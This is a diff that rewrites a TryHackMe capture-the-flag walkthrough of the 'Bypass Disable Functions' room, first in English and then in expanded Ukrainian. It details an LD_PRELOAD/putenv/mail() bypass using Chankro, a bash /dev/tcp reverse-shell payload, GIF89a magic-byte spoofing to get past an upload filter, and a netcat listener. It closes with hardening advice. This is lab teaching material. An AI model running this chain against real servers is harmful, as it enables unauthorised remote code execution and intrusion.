@@ -1,14 +1,83 @@
-Hi, today we have Bypass Disable Functions(https://tryhackme.com/room/bypassdisablefunctions)
+## TryHackMe: Bypass Disable Functions — Повне проходження (Writeup)
 
-1.The goal of the room is to gain control through file upload.
-2.Essentially, we need to overwrite LD_PRELOAD to change the path to OUR library.
-3.We will need to download the CHANKRO tool, which can be done using (git clone https://github.com/TarlogicSecurity/Chankro.git)
-4.After downloading, navigate to the Chankro folder using the command cd Chankro.
-5.Next, using the command gobuster dir -u http://ip_your_machine -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt, we need to find the phpinfo.php file.
-6.Next, open this file on the website and copy the full path, to which we will later append 'uploads' as specified in the task.
-7.Create a file using the nano shell.php command, write /bin/bash at the beginning of the file, and then paste the code from revshells.com, where we select bash -i but change sh to bash.
-8.Then, using the Chankro tool, we convert our file into a library: python2 chankro.py --arch 64 --input shell.php --output revshell.php --path <DocumentRoot_from_phpinfo.php>/uploads
-9.After that, open the newly created file and add GIF89a; to the very first line, right before the opening PHP tags.
-10.Next, open port 9001 using nc -lvnp 9001 and upload our newly created file to the website.
-11.After establishing the connection, run find / -name 'flag.txt' 2>/dev/null in the command line and get the flag.
-12.Completed
+## Про кімнату
+* **Назва:** [Bypass Disable Functions](https://tryhackme.com)
+* **Головна мета:** Отримати віддалений контроль над сервером (Reverse Shell) через вразливість завантаження файлів (File Upload) в умовах, коли стандартні небезпечні функції PHP (`system`, `exec`, `shell_exec` тощо) заблоковані в конфігурації `php.ini`.
+
+---
+
+## Суть вразливості та вектор атаки
+
+Коли адміністратори вимикають небезпечні PHP-функції через директиву `disable_functions`, стандартні вебшели перестають працювати. Проте, якщо в системі залишаються дозволеними функції `putenv()` та `mail()`, ми можемо обійти це обмеження.
+
+**Як це працює:**
+1. Функція `mail()` у Linux під капотом викликає системний бінарний файл `sendmail`.
+2. За допомогою `putenv()` ми можемо перезаписати змінну середовища **`LD_PRELOAD`**, вказавши шлях до нашої власної шкідливої бібліотеки (`.so`).
+3. Під час запуску `sendmail` система спочатку завантажить нашу бібліотеку, що дозволить виконати будь-який системний код в обхід обмежень PHP.
+
+Для автоматизації цього процесу ми використаємо утиліту **Chankro**.
+
+---
+
+## Покрокове проходження
+
+### Крок 1: Підготовка інструментарію
+Завантажуємо утиліту **Chankro** з офіційного репозиторію та переходимо в робочу директорію:
+
+```bash
+git clone https://github.com
+cd Chankro
+```
+
+### Крок 2: Розвідка та пошук шляхів
+Щоб Chankro згенерував правильний скрипт, нам потрібно знати точний фізичний шлях до директорії на сервері, куди завантажуються файли. Для цього проскануємо вебдодаток за допомогою `gobuster` у пошуках інформаційних сторінок (наприклад, `phpinfo.php`):
+
+```bash
+gobuster dir -u http://<IP_ВАШОЇ_МАШИНИ> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+```
+
+Знайшовши `phpinfo.php`, відкриваємо його в браузері та шукаємо параметр **`DOCUMENT_ROOT`** (наприклад, `/var/www/html`). Оскільки файли завантажуються в папку `uploads`, наш цільовий шлях виглядатиме так: `<DOCUMENT_ROOT>/uploads`.
+
+### Крок 3: Створення корисного навантаження (Payload)
+Створимо файл `shell.sh` (або `shell.php`), який міститиме інструкцію для зворотного підключення (Reverse Shell).
+
+1. Відкриваємо редактор:
+   ```bash
+   nano shell.sh
+   ```
+2. На самому початку вказуємо інтерпретатор `#!/bin/bash`, а нижче вставляємо згенерований реверс-шел із сайту [revshells.com](https://revshells.com) (обираємо варіант `bash -i`, замінивши `sh` на `bash`):
+   ```bash
+   #!/bin/bash
+   bash -i >& /dev/tcp/<ВАШ_IP>/9001 0>&1
+   ```
+
+### Крок 4: Генерація експлойту через Chankro
+Тепер запакуємо наш скрипт у PHP-дроппер, який автоматично створить `.so` бібліотеку на сервері та викличе її:
+
+```bash
+python2 chankro.py --arch 64 --input shell.sh --output revshell.php --path <DOCUMENT_ROOT>/uploads
+```
+*(Примітка: підставте реальне значення `DOCUMENT_ROOT`, отримане на Кроці 2).*
+
+### Крок 5: Обхід фільтрації файлів (Magic Bytes)
+Вебдодаток перевіряє тип завантажуваного файлу за його заголовком (Magic Bytes). Щоб замаскувати наш PHP-скрипт під легітимне зображення формату GIF:
+
+1. Відкрийте створений файл `revshell.php`.
+2. Додайте рядок **`GIF89a;`** на самий початок файлу — безпосередньо перед відкриваючим тегом `<?php`.
+
+### Крок 6: Отримання доступу та пошук прапора
+1. Запускаємо слухач (listener) на нашій машині на порту `9001`:
+   ```bash
+   nc -lvnp 9001
+   ```
+2. Завантажуємо файл `revshell.php` через форму на сайті та переходимо за прямим посиланням до нього (наприклад, `http://<IP_МАШИНИ>/uploads/revshell.php`), щоб активувати скрипт.
+3. Після отримання підключення в терміналі `netcat` знаходимо файл із прапором:
+   ```bash
+   find / -name 'flag.txt' 2>/dev/null
+   ```
+4. Читаємо вміст знайденого файлу за допомогою `cat` та здаємо завдання.
+
+---
+
+## ✅ Висновок
+Кімната чудово демонструє, що налаштування `disable_functions` у PHP не є панацеєю, якщо залишити активними функції роботи зі змінними оточення (`putenv`) та виклику зовнішніх процесів (`mail`). Для надійного захисту необхідно блокувати `putenv` або використовувати сучасні механізми ізоляції процесів.
